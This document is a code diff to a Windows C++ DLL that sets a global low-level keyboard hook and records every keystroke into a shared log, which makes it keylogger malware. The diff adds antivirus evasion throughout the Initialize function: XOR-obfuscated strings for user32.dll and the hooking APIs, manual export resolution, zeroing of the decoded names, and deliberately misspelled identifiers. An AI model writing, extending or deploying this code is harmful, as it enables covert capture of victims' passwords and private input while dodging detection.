@@ -5,6 +5,7 @@
 #include <string>
 #include <vector>
 #define DLL_EXPORT __declspec(dllexport)
+#define X_C(c) static_cast<char>((c) ^ 0xFF)
 ///////////////////////////////////////////////////////////////////////
 
 HMODULE hUser32;
@@ -17,18 +18,17 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void* FindExportAddress(HMODULE hModule, const char* funcName);
 ///////////////////////////////////////////////////////////////////////
 
-typedef HHOOK(WINAPI *SetWinHookFn)(int, HOOKPROC, HINSTANCE, DWORD);
-typedef BOOL(WINAPI *UnhookWinHookExFn)(HHOOK);
-typedef LRESULT(WINAPI *CallNxtHookExFn)(HHOOK, int, WPARAM, LPARAM);
-typedef BOOL(WINAPI *GetKeyboardStateFn)(PBYTE);
-typedef int(WINAPI *ToUnicodeFn)(UINT, UINT, PBYTE, LPWSTR, int, UINT);
+typedef HHOOK(WINAPI *Set_WinHuk_Fn)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL(WINAPI *Un_huk_WinHuk_ExFn)(HHOOK);
+typedef LRESULT(WINAPI *Call_NxtHuk_ExFn)(HHOOK, int, WPARAM, LPARAM);
+typedef BOOL(WINAPI *Get_Kbd_Stt_Fn)(PBYTE);
+typedef int(WINAPI *To_Unicode_Fn)(UINT, UINT, PBYTE, LPWSTR, int, UINT);
 
-SetWinHookFn MySetWindowsHookEx;
-UnhookWinHookExFn MyUnhookWindowsHookEx;
-CallNxtHookExFn MyCallNextHookEx;
-GetKeyboardStateFn MyGetKeyboardState;
-ToUnicodeFn MyToUnicode;
-
+Set_WinHuk_Fn My_Set_WinDows_Huk_ExA;
+Un_huk_WinHuk_ExFn My_Unhuk_WinDows_Huk_Ex;
+Call_NxtHuk_ExFn My_Call_Nxt_Huk_Ex;
+Get_Kbd_Stt_Fn My_Get_Kbd_Stt;
+To_Unicode_Fn My_ToUnicode;
 ///////////////////////////////////////////////////////////////////////
 
 void* FindExportAddress(HMODULE hModule, const char* funcName)
@@ -51,28 +51,53 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         }
     }
+    MessageBoxA(NULL, "Failed to find export address" , "Error", MB_OK);
     return nullptr;
 
 }
 
 DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
-    hUser32 = (HMODULE)LoadLibraryA("user32.dll");
-    MySetWindowsHookEx = (SetWinHookFn)FindExportAddress(hUser32, "SetWindowsHookExA");
-    MyUnhookWindowsHookEx = (UnhookWinHookExFn)FindExportAddress(hUser32, "UnhookWindowsHookEx");
-    MyCallNextHookEx = (CallNxtHookExFn)FindExportAddress(hUser32, "CallNextHookEx");
-    MyGetKeyboardState = (GetKeyboardStateFn)FindExportAddress(hUser32, "GetKeyboardState");
-    MyToUnicode = (ToUnicodeFn)FindExportAddress(hUser32, "ToUnicode");
+
+    char obf_Usr_32[] = { X_C('u'), X_C('s'), X_C('e'), X_C('r'), X_C('3'), X_C('2'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
+    char obf_Set_Win_Huk_ExA[] = { X_C('S'), X_C('e'), X_C('t'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), X_C('A'), '\0' };
+    char obf_Unhuk_Win_Huk_Ex[] = { X_C('U'), X_C('n'), X_C('h'), X_C('o'), X_C('o'), X_C('k'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
+    char obf_Cal_NxtHuk_Ex[] = { X_C('C'), X_C('a'), X_C('l'), X_C('l'), X_C('N'), X_C('e'), X_C('x'), X_C('t'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
+    char obf_Get_Kbd_Stt[] = { X_C('G'), X_C('e'), X_C('t'), X_C('K'), X_C('e'), X_C('y'), X_C('b'), X_C('o'), X_C('a'), X_C('r'), X_C('d'), X_C('S'), X_C('t'), X_C('a'), X_C('t'), X_C('e'), '\0' };
+    char obf_To_Unicode[] = { X_C('T'), X_C('o'), X_C('U'), X_C('n'), X_C('i'), X_C('c'), X_C('o'), X_C('d'), X_C('e'), '\0' };
+
+    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= 0xFF;
+    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= 0xFF;
+    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= 0xFF;
+    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= 0xFF;
+    for (int i = 0; obf_Get_Kbd_Stt[i] != '\0'; i++) obf_Get_Kbd_Stt[i] ^= 0xFF;
+    for (int i = 0; obf_To_Unicode[i] != '\0'; i++) obf_To_Unicode[i] ^= 0xFF;
+
+
+    hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
+    My_Set_WinDows_Huk_ExA = (Set_WinHuk_Fn)FindExportAddress(hUser32, obf_Set_Win_Huk_ExA);
+    My_Unhuk_WinDows_Huk_Ex = (Un_huk_WinHuk_ExFn)FindExportAddress(hUser32, obf_Unhuk_Win_Huk_Ex);
+    My_Call_Nxt_Huk_Ex = (Call_NxtHuk_ExFn)FindExportAddress(hUser32, obf_Cal_NxtHuk_Ex);
+    My_Get_Kbd_Stt = (Get_Kbd_Stt_Fn)FindExportAddress(hUser32, obf_Get_Kbd_Stt);
+    My_ToUnicode = (To_Unicode_Fn)FindExportAddress(hUser32, obf_To_Unicode);
+
+
+    SecureZeroMemory(obf_Usr_32, sizeof(obf_Usr_32));
+    SecureZeroMemory(obf_Set_Win_Huk_ExA, sizeof(obf_Set_Win_Huk_ExA));
+    SecureZeroMemory(obf_Unhuk_Win_Huk_Ex, sizeof(obf_Unhuk_Win_Huk_Ex));
+    SecureZeroMemory(obf_Cal_NxtHuk_Ex, sizeof(obf_Cal_NxtHuk_Ex));
+    SecureZeroMemory(obf_Get_Kbd_Stt, sizeof(obf_Get_Kbd_Stt));
+    SecureZeroMemory(obf_To_Unicode, sizeof(obf_To_Unicode));
 
     sharedLogVector = logVector;  
-    k_Hook = MySetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    k_Hook = My_Set_WinDows_Huk_ExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 }
 
 DLL_EXPORT void Cleanup()
 {
     if (k_Hook) 
     {
-        MyUnhookWindowsHookEx(k_Hook);
+        My_Unhuk_WinDows_Huk_Ex(k_Hook);
         FreeLibrary(hUser32);
         k_Hook = nullptr;
     }
@@ -84,7 +109,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     {
         KBDLLHOOKSTRUCT* k_Info = (KBDLLHOOKSTRUCT*)lParam;
         BYTE k_State[256];
-        MyGetKeyboardState(k_State);
+        My_Get_Kbd_Stt(k_State);
         WCHAR outputChar[2] = { 0 };
 
         {
@@ -216,7 +241,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                             break;
                         default:
                         {
-                            int result = MyToUnicode(k_Info->vkCode, k_Info->scanCode, k_State, outputChar, 1, 0);
+                            int result = My_ToUnicode(k_Info->vkCode, k_Info->scanCode, k_State, outputChar, 1, 0);
                             if (result == 1)
                             {
                                 std::string utf8Char(1, (char)outputChar[0]); 
@@ -253,5 +278,5 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         }
     }
 
-    return MyCallNextHookEx(k_Hook, nCode, wParam, lParam);
+    return My_Call_Nxt_Huk_Ex(k_Hook, nCode, wParam, lParam);
 }
